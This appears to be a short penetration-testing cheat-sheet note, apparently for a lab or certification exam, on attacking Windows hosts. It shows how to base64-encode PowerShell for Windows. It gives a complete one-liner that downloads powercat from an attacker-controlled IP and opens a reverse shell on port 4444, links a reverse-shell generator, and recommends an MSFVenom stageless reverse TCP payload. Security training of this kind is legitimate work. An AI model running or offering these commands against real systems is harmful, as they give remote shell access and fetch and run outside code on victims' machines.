If you are attacking Windows, here is how to base64 encode in linux so that Windows can use it.

```console
echo -n "a powershell command" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
```
Here is an example that downloads powercat and then uses it to start a reverseshell
```console
echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1'); powercat -c 192.168.119.2 -p 4444 -e powershell" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
```
Great site for generating shells.
[Revshells.com](https://www.revshells.com/) 
<hr style="border-color:red"><p style="color:red;text:center">If you use MSFVenom, always use the 4th option Windows Stageless Reverse TCP so you get full points</p><hr style="border-color:red">
